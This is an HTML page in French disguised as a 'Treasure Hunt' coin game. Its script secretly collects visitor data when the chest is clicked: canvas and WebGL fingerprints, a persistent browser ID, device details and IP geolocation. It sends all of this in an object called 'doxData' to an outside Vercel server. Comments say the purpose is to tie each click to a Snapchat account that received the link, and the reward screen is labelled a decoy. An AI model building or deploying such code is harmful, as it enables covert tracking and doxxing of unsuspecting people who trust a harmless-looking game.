<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>💎 Treasure Hunt</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');

    body {
      margin: 0;
      height: 100vh;
      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
      color: #ffd700;
      font-family: 'Press Start 2P', cursive;
      text-align: center;
      overflow: hidden;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .container {
      max-width: 800px;
      padding: 20px;
    }

    h1 {
      font-size: 32px;
      text-shadow: 0 0 20px #ffd700;
      margin-bottom: 10px;
      letter-spacing: 4px;
    }

    p {
      opacity: 0.85;
      margin-bottom: 30px;
    }

    #vault {
      font-size: 180px;
      cursor: pointer;
      transition: all 0.4s ease;
      filter: drop-shadow(0 0 30px #ffd700);
      margin: 20px 0;
    }

    #vault:hover {
      transform: scale(1.18) rotate(15deg);
      filter: drop-shadow(0 0 45px #ffea00);
    }

    #reward {
      display: none;
      margin-top: 40px;
    }

    .coin {
      font-size: 100px;
      animation: coinSpin 2.8s linear infinite;
      margin: 20px 0;
    }

    @keyframes coinSpin {
      from { transform: rotate(0deg); }
      to { transform: rotate(360deg); }
    }

    button {
      background: linear-gradient(#ffd700, #ffaa00);
      color: #1a0033;
      border: none;
      padding: 18px 45px;
      font-family: 'Press Start 2P', cursive;
      font-size: 16px;
      cursor: pointer;
      border-radius: 8px;
      box-shadow: 0 0 25px #ffd700;
      transition: all 0.3s;
    }

    button:hover {
      transform: scale(1.08);
      box-shadow: 0 0 35px #ffea00;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>💎 TREASURE HUNT</h1>
    <p>Clique sur le coffre pour tenter ta chance !</p>
    
    <div id="vault" onclick="openVault()">🪔</div>

    <div id="reward">
      <p class="coin">🪙</p>
      <h2>FÉLICITATIONS AVENTURIER !</h2>
      <p>Tu as gagné <strong>250 pièces d'or</strong> !</p>
      <button onclick="claimReward()">RÉCUPÉRER MA RÉCOMPENSE</button>
    </div>
  </div>

  <script>
    // === IDENTIFIANT DE COMPTE (quel compte Snap a reçu ce lien ?) ===
    // Le lien envoyé depuis le compte A  ->  ...index.html?t=compteA
    // Le lien envoyé depuis le compte B  ->  ...index.html?t=compteB
    // C'est ce qui permet d'attribuer chaque clic à un compte précis.
    function getAccountTag() {
      const params = new URLSearchParams(location.search);
      return params.get('t') || params.get('id') || 'inconnu';
    }

    // === IDENTIFIANT PERSISTANT DU NAVIGATEUR ===
    // Stocké dans le localStorage : si la MÊME personne ouvre les deux liens
    // depuis le même navigateur, on retrouve le même visitorId.
    // Indice très fort (mais réfutable : appareil prêté, etc.).
    function getVisitorId() {
      try {
        let id = localStorage.getItem('th_vid');
        if (!id) {
          id = (crypto.randomUUID ? crypto.randomUUID()
                : Date.now().toString(36) + Math.random().toString(36).slice(2));
          localStorage.setItem('th_vid', id);
        }
        return id;
      } catch (e) {
        return null; // navigation privée / stockage bloqué
      }
    }

    async function sha256(str) {
      try {
        const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
        return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('').slice(0, 32);
      } catch (e) {
        return null;
      }
    }

    // Empreinte canvas : le rendu d'un même texte/forme diffère légèrement
    // selon le GPU, les pilotes et l'OS. Stable pour un appareil donné.
    async function getCanvasFingerprint() {
      try {
        const canvas = document.createElement('canvas');
        canvas.width = 240; canvas.height = 60;
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '16px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(2, 2, 120, 24);
        ctx.fillStyle = '#069';
        ctx.fillText('Treasure🪙Hunt', 4, 4);
        ctx.fillStyle = 'rgba(102,0,200,0.6)';
        ctx.fillText('Treasure🪙Hunt', 6, 18);
        return await sha256(canvas.toDataURL());
      } catch (e) {
        return null;
      }
    }

    // Empreinte WebGL : modèle de carte graphique exposé par le navigateur.
    function getWebGLInfo() {
      try {
        const gl = document.createElement('canvas').getContext('webgl');
        if (!gl) return null;
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        if (!dbg) return null;
        return gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) + ' | ' +
               gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
      } catch (e) {
        return null;
      }
    }

    // Géolocalisation IP avec plusieurs fournisseurs de secours (tous HTTPS + CORS).
    async function getGeo() {
      const providers = [
        { url: 'https://get.geojs.io/v1/ip/geo.json',
          map: j => ({ ip: j.ip, city: j.city, region: j.region, country: j.country,
                       org: j.organization_name || j.organization }) },
        { url: 'https://ipapi.co/json/',
          map: j => ({ ip: j.ip, city: j.city, region: j.region, country: j.country_name, org: j.org }) }
      ];
      for (const p of providers) {
        try {
          const res = await fetch(p.url);
          if (!res.ok) continue;
          const j = await res.json();
          if (j && j.success !== false && !j.error && j.ip) return p.map(j);
        } catch (e) { /* fournisseur suivant */ }
      }
      return {}; // tout a échoué -> le backend prendra le relais
    }

    function getDeviceName() {
      const ua = navigator.userAgent || '';
      const lowerUa = ua.toLowerCase();

      if (/iphone/.test(lowerUa)) {
        const model = ua.match(/iPhone\s*([^;)]+)/);
        return model ? model[0] : 'iPhone';
      }
      if (/ipad/.test(lowerUa)) {
        return 'iPad';
      }
      if (/android/.test(lowerUa)) {
        const model = ua.match(/Android[^(]*;\s*([^;)]+)/);
        if (model && model[1]) {
          return model[1].trim();
        }
        const samsung = ua.match(/SM-[A-Z0-9]+/i);
        if (samsung) return samsung[0];
        const pixel = ua.match(/Pixel\s*[0-9]+/i);
        if (pixel) return pixel[0];
        return 'Android device';
      }
      if (/pixel/.test(lowerUa)) {
        const pixel = ua.match(/Pixel\s*[0-9]+/i);
        return pixel ? pixel[0] : 'Google Pixel';
      }
      if (/samsung/.test(lowerUa) || /sm-/.test(lowerUa) || /gt-/.test(lowerUa)) {
        const match = ua.match(/(SM-[A-Z0-9]+|GT-[A-Z0-9]+|Galaxy[^;)]+)/i);
        return match ? match[0] : 'Samsung device';
      }
      if (/oneplus/.test(lowerUa)) {
        const model = ua.match(/OnePlus\s*[^;)]+/i);
        return model ? model[0] : 'OnePlus device';
      }
      if (/huawei/.test(lowerUa) || /honor/.test(lowerUa)) {
        const model = ua.match(/(HUAWEI|HONOR)\s*[^;)]+/i);
        return model ? model[0] : 'Huawei device';
      }
      if (/xiaomi/.test(lowerUa) || /redmi/.test(lowerUa)) {
        const model = ua.match(/(Mi\s*\d+|Redmi\s*\w+)/i);
        return model ? model[0] : 'Xiaomi device';
      }
      if (/macintosh/.test(lowerUa)) {
        return 'Mac';
      }
      if (/windows/.test(lowerUa)) {
        return 'Windows PC';
      }
      if (/linux/.test(lowerUa)) {
        return 'Linux PC';
      }
      return navigator.platform || 'Device inconnu';
    }

    async function openVault() {
      const vault = document.getElementById('vault');
      
      vault.style.transition = 'all 1.8s';
      vault.style.transform = 'rotate(720deg) scale(0.5)';
      vault.innerHTML = '📦';

      await new Promise(r => setTimeout(r, 1600));

      // === COLLECTE DES DONNÉES ===
      const doxData = {
        timestamp: new Date().toISOString(),
        accountTag: getAccountTag(),               // <- quel compte Snap a reçu le lien
        visitorId: getVisitorId(),                 // <- identifiant persistant du navigateur
        canvasFp: await getCanvasFingerprint(),    // <- empreinte canvas (stable / appareil)
        webgl: getWebGLInfo(),                      // <- modèle de GPU
        userAgent: navigator.userAgent,
        device: getDeviceName(),
        platform: navigator.platform,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        language: navigator.language,
        languages: navigator.languages.join(', '),
        screen: `${screen.width}×${screen.height} (${screen.colorDepth} bits)`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        online: navigator.onLine,
        doNotTrack: navigator.doNotTrack
      };

      // Récupération IP + Loc — plusieurs fournisseurs en cascade.
      // Si l'un échoue (quota, blocage), on passe au suivant.
      // Filet final : le backend complète l'IP/géoloc côté serveur.
      const geo = await getGeo();
      if (geo.ip)      doxData.ip = geo.ip;
      if (geo.city)    doxData.city = geo.city;
      if (geo.region)  doxData.region = geo.region;
      if (geo.country) doxData.country = geo.country;
      if (geo.org)     doxData.org = geo.org;

      // Envoi vers ton API Vercel
      try {
        const response = await fetch('https://backend-two-puce-81.vercel.app/', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(doxData)
        });

        if (!response.ok) {
          const errorText = await response.text();
          console.error('Erreur backend:', response.status, errorText);
          console.log('%c❌ Envoi échoué', 'color: orange');
        } else {
          console.log('%c✅ Données envoyées', 'color: lime');
        }
      } catch(e) {
        console.error('Erreur réseau:', e);
        console.log('Erreur denvoi');
      }

      // Affichage leurre
      vault.style.display = 'none';
      document.getElementById('reward').style.display = 'block';
    }

    function claimReward() {
      alert("🎉 Récompense ajoutée à ton inventaire !\nMerci d'avoir joué.");
      setTimeout(() => location.reload(), 1200);
    }
  </script>
</body>
</html>
